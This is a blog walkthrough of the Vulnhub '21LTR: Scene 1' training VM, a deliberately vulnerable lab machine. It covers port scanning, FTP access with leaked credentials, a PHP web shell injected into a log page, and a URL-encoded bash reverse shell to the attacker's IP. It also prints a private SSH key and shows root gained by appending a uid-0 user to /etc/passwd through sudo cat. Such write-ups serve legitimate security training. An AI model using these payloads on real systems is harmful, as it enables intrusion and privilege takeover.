---
layout: post
title: "LTR Scene 1 Walthrough (Vulnhub)"
date: 2017-03-26 12:00:00
share: true
comments: true
tags: [Vulnhub Walkthrough]
---

21LTR: Scene 1 VM can be downloaded [here](https://www.vulnhub.com/entry/21ltr-scene-1,3/). Had to use a couple of hints to proceed.

## 0\. Get VMs IP

Not needed, VM has a static IP. You might need to change your VirtualBox/VMware settings to get on the right subnet (192.168.2.0/24), I followed [this](https://pubs.vmware.com/workstation-9/index.jsp?topic=%2Fcom.vmware.ws.using.doc%2FGUID-AF4C4227-2499-440B-A297-A4097A5C94AA.html).  

---  

## 1\. Enumeration

#### TCP Ports enumeration

```console
root@kali:~# nmap -sV 192.168.2.120  
  
Starting Nmap 7.40 ( https://nmap.org ) at 2017-03-26 15:01 EDT  
Nmap scan report for 192.168.2.120  
Host is up (0.00011s latency).  
Not shown: 65531 closed ports  
PORT      STATE SERVICE     VERSION  
21/tcp    open  ftp         ProFTPD 1.3.1  
22/tcp    open  ssh         OpenSSH 5.1 (protocol 1.99)  
80/tcp    open  http        Apache httpd 2.2.13 ((Unix) DAV/2 PHP/5.2.10)  
10001/tcp open  scp-config?  
MAC Address: 00:0C:29:00:00:B3 (VMware)  
Service Info: OS: Unix  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 12.26 seconds  
```

---

## 2\. Web server

Checking the sourcecode reveals credentials for user "logs":  

```html  
    <!-- username:logs password:zg]E-b0]+8:(58G -->  
```

  
Using the creds to SSH into the server didn't work, it did work for the FTP server running though. Logs is very likely to be a virtual user. Worth noting is that our FTP working directory is mapped to `/` (you can check that with **pwd **command) and only a single php file is found, executing `get backup_log.php` will download the file into our local directory.  

```console
root@kali:/tmp# cat backup_log.php   
<html>                                                                                                                        
        <head>  
                <title></title>  
        </head>                  
        <body>   
                <h2 style="text-align: center">  
                        Intranet Dev Server Backup Log</h2>  
                        <?php $log = time(); echo '<center><b>GMT time is: '.gmdate('r', $log).'</b></center>'; ?>            
                <p>                                                                                                           
                        &nbsp;</p>               
                <h4>                             
                        Backup Errors:</h4>  
                <p>                          
                        &nbsp;</p>           
        </body>                              
</html>  
  
Wed, 03 Jan 2012 09:51:42 +0000 from 192.168.2.240: Permission denied  
<br><br>  
Thu, 04 Jan 2012 13:11:29 +0000 from 192.168.2.240: No Such file or directory  
<br><br>  
Thu, 04 Jan 2012 13:31:36 +0000 from 192.168.2.240: No space left on device  
<br><br>  
Thu, 04 Jan 2012 13:41:36 +0000 from 192.168.2.240: No Space left on device  
<br><br>  
Mon, 16 Feb 2012 17:01:02 +0000 from 192.168.2.240: No Space left on device  
<br><br>  
Fri, 23 Apr 2012 10:51:07 +0000 from 192.168.2.240: No Space left on device  
<br><br>  
Fri, 12 May 2012 16:41:32 +0000 from 192.168.2.240: No Space Left on device  
<br><br>  
GET / HTTP/1.0  
```    

  
Dirbuster reveals there's a `/logs/` directory, which contains the file we just found (`/logs/` returns a 4xx, so you need to manually append the file name).  
  
I poked around and didn't find anything of use, but the logs do show that a specific IP tried to access the box, why don't we try changing our IP to it?  

```console
root@kali:/tmp# ifconfig eth0 192.168.2.240 netmask 255.255.255.0  
root@kali:/tmp# ifconfig  
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500  
        inet **192.168.2.240**  netmask 255.255.255.0  broadcast 192.168.2.255  
        inet6 fe80::20c:29ff:fe77:ef24  prefixlen 64  scopeid 0x20<link>  
        ether 00:0c:29:77:ef:24  txqueuelen 1000  (Ethernet)  
        RX packets 500271  bytes 63946744 (60.9 MiB)  
        RX errors 0  dropped 0  overruns 0  frame 0  
        TX packets 571896  bytes 49438370 (47.1 MiB)  
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  
        device interrupt 19  base 0x2024    
```    

  
At this point I got stuck, and had to check a walkthrough for tips. While scrolling down carefully, they mentioned using wireshark and just listening for a while. The server attempted to connect to port 10000 and gives a whole lot of garbled data. Waited another 5 minutes and made sure this time to store the data. It was a gzip file, decompressing it revealed lots of files, but it's still suspicious how to use it next.  
  
From time to time I noticed that port 10001 opens up (noticed it at the very start), when I found it open I wrote some stuff into it then hit CTRL+C. 

Nothing happened! But then I checked the backup_log.php file again, **it was blank**. I believe there's a bug with the code, but ultimately I had to restart the VM and this time when I wrote some text I waited till the port time out. Refreshing the php file shows our output as well as executes any php code embedded.  
  
_(Oh and by the way, this seems to happen after the server tries to contact us
on port 10000.)_  

```console    
root@kali:~/Desktop# cat text  
It's me, abatchy  
<?php system($_GET['cmd']) ?> 


root@kali:~/Desktop# nc -nvlp 10000 > file.gz && nc -nv 192.168.2.120 10001 < text  
listening on [any] 10000 ...  
connect to [192.168.2.240] from (UNKNOWN) [192.168.2.120] 49182  
(UNKNOWN) [192.168.2.120] 10001 (?) open 


root@kali:~/Desktop# curl http://192.168.2.120/logs/backup_log.php?cmd=whoami


... 


<redacted>   
...


It's me, abatchy apache  
```
  
Awesome, let's try a bash one-liner to get a reverse shell. First start a listener on port 443.
```console
------------------------------Terminal 1------------------------------ 


root@kali:~/Desktop# nc -nvlp 443  
listening on [any] 443 ...


------------------------------Terminal 2------------------------------ 


root@kali:~/Desktop# curl "http://192.168.2.120/logs/backup_log.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.240%2F443%200%3E%261"


------------------------------Terminal 1------------------------------ 


root@kali:~/Desktop# nc -nvlp 443  
listening on [any] 443 ...  
connect to [192.168.2.240] from (UNKNOWN) [192.168.2.120] 42663  
bash: no job control in this shell  
bash-3.1$ hostname  
slax  
bash-3.1$ tail /etc/passwd  
sshd:x:33:33:sshd:/:/bin/false  
gdm:x:42:42:GDM:/var/state/gdm:/bin/bash  
apache:x:80:80:User for Apache:/srv/httpd:/bin/false  
messagebus:x:81:81:User for D-BUS:/var/run/dbus:/bin/false  
haldaemon:x:82:82:User for HAL:/var/run/hald:/bin/false  
pop:x:90:90:POP:/:/bin/false  
nobody:x:99:99:nobody:/:/bin/false  
hbeale:x:1001:10:,,,:/home/hbeale:/bin/bash  
jgreen:x:1002:10:,,,:/home/jgreen:/bin/bash  
logs:x:1003:100:,,,:/tmp:/bin/bash  
bash-3.1$ 
```
  
After some poking around I found a directory containing an RSA key.  

```console    
bash-3.1$ ls -al  
total 8  
drwxrwxrwx 2 root root   80 Jun  6  2012 .  
drwxrwxrwx 3 root root   80 Jun 19  2012 ..  
-rwxrwxrwx 1 root root  393 Jun  2  2012 authorized_keys  
-rwxrwxrwx 1 root root 1675 Jan  5  2008 id_rsa  
bash-3.1$ pwd  
/media/USB_1/Stuff/Keys  
bash-3.1$ cat id_rsa  
-----BEGIN RSA PRIVATE KEY-----  
MIIEoQIBAAKCAQEA1pfb/CVukUw4Xe67YLEZzVHWNax0zJjI1CfcsoEGylmmtlA6  
iXHi41nLshzXu9n536JfM9LFAWGqefBVX7Bzd/fC4+jHS3q89IK9FP7gFPwEmlNH  
CwPX0ADxDFyB1lJOFffJ9gVw3VgHCaCPgS70UqJD0hZFDMSDMoBa91PylFQR0m58  
nMq8DsGRbeC5hTdpLXKfBuW8v/lFuNEWVWNcZDie82aiJg8WRUUIrzeGZSR3+cG1  
hi6za67VIi+ce8fFuBvIgaEpvJ0JSIX7zPLUV10ezW1NQRNplKSam3TIYI3+Ywuh  
lcgpEyliHYReN6v91+um2c6LNy9y/vx2Akci5QIBIwKCAQEAvhF5s3GcchBPLqA/  
kCfVBk/MW2zcerM1iLWXlsoNVCOFB+Co4CMKyV4pcd8IOKsfJSlqQ9fwUa5GiUKU  
wne2urbf0S1CzdMcY4m9al4W7gPJkACeAnEeO+OTq9zoBvhxDCSc79ju7+7hqXD0  
IfZjXyIBjjD7VHOKJWpfMtVTMunBCMqoAMa2veuN6LgDJweQNi7kon4qcj4SghGI  
bdBv/Cnk7PMkG+DhafTRWyXGMWFpTHV4BNKv0i+k4lVV1oP9nJnh9jglY4EkD9LD  
0Yt2QZt+XMTlxScsjcBpVGc9m4ZrgmRZGV0PTyMuWJtURkDBYPizkiPjjSZfUbyZ  
y9QECwKBgQDsR9wLzrQbJIaOX8dG4rEt8pQHdYK7KCM8Bcq45iKKPzeLxchguM3o  
+y9nRz5x8RWXWZUMl7PldoqwmrKh6WVCrdJ7mghPTYx3Djhcaf8q5XFTUhZH4xhB  
72g1H6+JCECUjAFfjoSTOEswCFKYssgYA22x3fvLGg3S8f0UjjE1xQKBgQDogKVg  
iyXCE833evccfrd/otsyVcxNincunAtYDAsqa2ZrjXL3oFwNwfC1CVKPhqDlnG46  
M1tiSeYXygPbuPbHzRdu0ZuG7jRxxVdndl52gq/Zt8MKNRD9mdbFRcRMXmMRfaE4  
RXdry9eB4rPywfWgJPGNVtOFZP6PRVv+IpoqoQKBgBRArHYKZzWGybRunA1j400U  
ytwRYvoZYhsWcHY/nI+Bwu65Lm6wwTE6GgGJw4Yb+olQ0kLoboFh7qFsWHRHNJCv  
0DZ66sT4BLm/Y+qp/+275SRmHyq7sZ9AaASNr/XNgeDYzOru9Wu0XjdRK6awPQlf  
YSyAvc+UhNeRFbFOBDfPAoGAVlurI9vpc/i6N1mO+/SNTKo0KKOGZfGZ+16H3t/m  
496/pEp7KMaIl2VKxuY0m7WpedsEXsKeSRQiQ1mpqWH1QuXG4AS2HCyXIvGG3Uk5  
B3JekrH3/HocQO//UJZBmLVX/y6pmI7UlcC9wodnaMuzAPfHbwL+G5qKb7qtI+D3  
busCgYATj4y+8msxNWRRNbHWAV7G0OurPDeZJ8F8NDLpM22X8fM08wgGRwkW4fpa  
A+J8tN2ibiDqw29W6Rc1/4evAPbo3GR932W/ELOTOpP2yquiwoSxPG+HCLHmDITr  
1qGHJRSOiFzo99iS5aQRhUvdl3M0lz1Cort7hjRKUkSWcT02Rw==  
-----END RSA PRIVATE KEY-----  
```

I copied it over and set the right permissions:  

```
root@kali:~/Desktop# chmod 600 key  
root@kali:~/Desktop# ssh -i key hbeale@192.168.2.120  
Linux 2.6.27.27.  
hbeale@slax:~$ whoami  
hbeale  
```

Nice. First thing I always try on a low priv is `sudo -l`.

```console
root@kali:~/Desktop# ssh -i key hbeale@192.168.2.120  
Linux 2.6.27.27.  
hbeale@slax:~$ whoami  
hbeale  
hbeale@slax:~$ sudo -l  
User hbeale may run the following commands on this host:  
    (root) NOEXEC: /bin/ls, (root) /usr/bin/cat, (root) /usr/bin/more, (root)  
    !/usr/bin/su *root*  
    (root) NOPASSWD: /usr/bin/cat  
```

Awesome, we can edit files with cat using the &gt;&gt; operator. Let's add a root user.

```console
hbeale@slax:~$ sudo /usr/bin/cat >> /etc/passwd  
abatchy::0:0::/root:/bin/bash  
^C  
hbeale@slax:~$ su abatchy  
root@slax:/home/hbeale# id


uid=0(root) gid=0(root) groups=0(root) 
```
  
Voila, we got root.  
  
---

## Final notes

 Not sure if the author did it on purpose to just write some input to port 10001 and discover it's written to the php file or not, please leave a comment if you got an answer to that.

\- Abatchy
